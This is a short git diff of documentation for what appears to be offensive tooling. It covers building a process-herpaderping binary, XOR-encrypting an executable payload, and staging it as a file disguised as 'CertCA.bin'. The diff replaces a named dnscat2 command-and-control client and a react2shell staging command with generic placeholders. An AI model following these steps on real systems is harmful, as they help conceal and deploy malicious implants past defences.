@@ -161,18 +161,12 @@ msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 \
     /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin"
 ```
 
-**Encode dnscat2 payload before staging (Python side):**
+**Encode malicious payload before staging (Python side):**
 
 ```bash
-python resources/payloads/react2shell-tool/encrypt_payload_xor.py \
-    resources/payloads/dnscat2/go-client/dnscat2.exe -o CertCA.bin
+python encrypt_payload_xor.py \
+    path/to/malicious/payload.exe -o CertCA.bin
 # Verify: first byte should be 0xEE (0x4D ^ 0xA3)
-```
-
-Or via react2shell `stage --encrypt`:
-
-```
-stage --encrypt ../dnscat2/go-client/dnscat2.exe C:\ProgramData\CertCA.bin
 ```
 
 **When to enable:**
